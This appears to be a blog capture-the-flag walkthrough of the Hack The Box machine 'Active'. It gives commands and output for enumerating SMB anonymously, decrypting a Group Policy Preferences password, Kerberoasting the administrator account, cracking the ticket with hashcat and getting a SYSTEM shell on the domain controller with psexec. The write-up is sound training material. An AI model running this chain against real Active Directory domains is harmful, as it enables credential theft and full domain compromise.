---
title: HTB - Active
date: 2024-03-17
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, active, nmap, netexec, nxc, smbmap, smbclient, smb, gpp-decrypt, getnpusers, hashcat, active-directory, kerberoasting, impacket, getnpusers]
img_path: /assets/htb/fullpwn/active
published: true
image:
    path: machine_info.png
---

## HTB: Active

>[Active Box](https://app.hackthebox.com/machines/148)

![](active_diagram.png){: .normal}

## Walkthrough Summary

|Step|Action|Tool|Achieved|
|-|-|-|-|
|1|Enumerated SMB server|[NetExec](https://github.com/Pennyw0rth/NetExec), [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html#:~:text=smbclient%20is%20a%20client%20that,see%20ftp(1))|Obtained the encrypted password of _svc\_tgs_|
|2|Decrypted password|[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)|Obtained clear text password|
|3|Enumerated Domain Users|[NetExec](https://github.com/Pennyw0rth/NetExec)|Obtained 3 additional usernames|
|4|Kerberoasting|[GetUserSPNs](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)|Obtained the TGS ticket of _administrator_|
|5|Hash cracked|[Hashcat](https://github.com/hashcat/hashcat)|Obtained clear text password|
|6|Logged into the DC as _administrator_|[psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)|Compromised domain|

## Detailed attack chain reproduction steps

TCP all-ports scan:

```bash
$ sudo nmap 10.10.10.100 -T4 -A -open -p-

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 17:23:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC

Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Enumerate SMB via **NULL session**:

```bash
$ nxc smb 10.10.10.100 -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\:
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users
```

Enumerate the _Replication_ share:

```bash
# connected to the share
$ smbclient //10.10.10.100/Replication
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  active.htb                          D        0  Sat Jul 21 11:37:44 2018

                5217023 blocks of size 4096. 290937 blocks available
smb: \> cd active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 11:37:44 2018
  Policies                            D        0  Sat Jul 21 11:37:44 2018
  scripts                             D        0  Wed Jul 18 19:48:57 2018

                5217023 blocks of size 4096. 289977 blocks available

# downloaded the directory recursively
smb: \> recurse ON
smb: \> prompt OFF
smb: \active.htb\> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (1.2 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (27.0 KiloBytes/sec) (average 6.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (5.2 KiloBytes/sec) (average 6.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (10.6 KiloBytes/sec) (average 7.2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (35.3 KiloBytes/sec) (average 11.2 KiloBytes/sec)

# confirm that files were downloaded
smb: \active.htb\> !ls
active.htb mimikatz.exe PowerView.ps1  SharpHound.exe winPEAS.exe
```

Enumerate downloaded directory:

```bash
$ tree active.htb/
active.htb/
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

22 directories, 7 files

$ cat Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edB<REDACTED>VmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Decrypt encrypted password:

```bash
$ gpp-decrypt edB<REDACTED>VmQ
GPP<REDACTED>k18
```

Confirm credentials:

```bash
$ nxc smb 10.10.10.100 -u svc_tgs -p GPP<REDACTED>k18
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPP<REDACTED>k18
```

Enumerate SMB with the obtained credentials:

```bash
$ smbmap -d active.htb -u svc_tgs -p GPP<REDACTED>k18 -H 10.10.10.100

<SNIP>

[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY

# spider the specified share
$ smbmap -d active.htb -u svc_tgs -p GPP<REDACTED>k18 -H 10.10.10.100 -r Users --depth 3

<SNIP>
 ./Users/SVC_TGS/Desktop
        dr--r--r--                0 Sat Jul 21 16:14:42 2018    .
        dr--r--r--                0 Sat Jul 21 16:14:42 2018    ..
        fw--w--w--               34 Sun Mar 17 17:21:41 2024    user.txt

# connect to the specified share and comprise the user.txt file
$ smbclient //10.10.10.100/Users -U active.htb/svc_tgs%GPP<REDACTED>k18
Try "help" to get a list of possible commands.
smb: \> cd svc_tgs
smb: \svc_tgs\> cd desktop
smb: \svc_tgs\desktop\> get user.txt
getting file \svc_tgs\desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \svc_tgs\desktop\> !cat user.txt
a33<REDACTED>173
```

Enumerate domain users:

```bash
$ nxc smb 10.10.10.100 -u svc_tgs -p GPP<REDACTED>k18 --users
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPP<REDACTED>k18
SMB         10.10.10.100    445    DC               [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.100    445    DC               [+] Enumerated domain user(s)
SMB         10.10.10.100    445    DC               active.htb\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.10.100    445    DC               active.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.100    445    DC               active.htb\krbtgt                         Key Distribution Center Service Account
SMB         10.10.10.100    445    DC               active.htb\SVC_TGS
```

Check for **ASREPRoasting**:

```bash
$ getnpusers active.htb/administrator -dc-ip 10.10.10.100 -no-pass
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[*] Getting TGT for administrator
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Check for **Kerberoasting**:

```bash
$ getuserspns -dc-ip 10.10.10.100 active.htb/svc_tgs -request
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2024-03-17 17:21:44.906954

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$682<REDACTED>399
```

Crack the password hash offline:

```bash
# detect appropriate mode with auto-detect
$ hashcat admin_tgs_hash
<SNIP>
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

# crack hash
$ hashcat -m 13100 admin_tgs_hash /usr/share/wordlists/rockyou.txt

<SNIP>

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$682<REDACTED>399:Tic<REDACTED>968

<SNIP>
```

Connect as _administrator_ and compromise the **_root.txt_** file:

```bash
$ psexec active.htb/administrator:Tic<REDACTED>968@10.10.10.100
Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file DeOgSpqI.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service ImRH on 10.10.10.100.....
[*] Starting service ImRH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
d01<REDACTED>c03
```